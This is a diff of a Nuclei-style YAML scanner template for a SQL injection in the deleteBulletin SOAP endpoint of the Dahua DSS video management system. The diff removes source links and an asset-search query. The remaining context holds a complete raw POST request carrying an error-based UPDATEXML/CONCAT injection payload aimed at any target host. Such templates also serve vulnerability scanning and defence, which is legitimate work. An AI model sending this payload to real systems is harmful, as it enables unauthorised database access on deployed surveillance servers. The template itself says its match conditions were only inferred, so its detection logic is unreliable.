@@ -3,14 +3,8 @@ info:
   name: 大华DSS视频管理系统deleteBulletin存在SQL注入漏洞
   author: hacktwo
   severity: high
-  description: '来源: 语雀漏洞知识库 https://www.yuque.com/hacktwo/dtdx2v/62a5ccdef9eb2217d471c60512fa7ae4
-
-    [!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
+  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
   tags: sqli,2025
-  metadata:
-    source: yuque-hacktwo-dtdx2v
-    doc-slug: 62a5ccdef9eb2217d471c60512fa7ae4
-    fofa: + hunter：`app.name=="Dahua 大华 DSS 视频管理系统"`
 http:
 - raw:
   - "POST /portal/services/itcBulletin HTTP/1.1\nUser-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.15; rv:121.0) Gecko/20100101 Firefox/121.0\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8\nAccept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2\nAccept-Encoding: gzip, deflate\nConnection: close\nCookie: JSESSIONID=0F29FE3B0C2BF1E508A7119E327E2B44; JSESSIONID=D08F471237625640BE6F9DE648EC1EE6\nUpgrade-Insecure-Requests: 1\nSOAPAction:\nContent-Type: text/xml;charset=UTF-8\nHost: {{Hostname}}\nContent-Length: 436\n\n<soapenv:Envelope xmlns:soapenv=\"http://schemas.xmlsoap.org/soap/envelope/\" xmlns:itc=\"http://itcbulletinservice.webservice.dssc.dahua.com\">\n   <soapenv:Header/>\n   <soapenv:Body>\n      <itc:deleteBulletin>\n         <!--type: string-->\n         <netMarkings>(UPDATEXML(5791,CONCAT(0x2e,0x716b706a71,(SELECT (ELT(5791=5791,1))),0x716a707a71),1058))</netMarkings>\n\n      </itc:deleteBulletin>\n\n   </soapenv:Body>\n\n</soapenv:Envelope>"
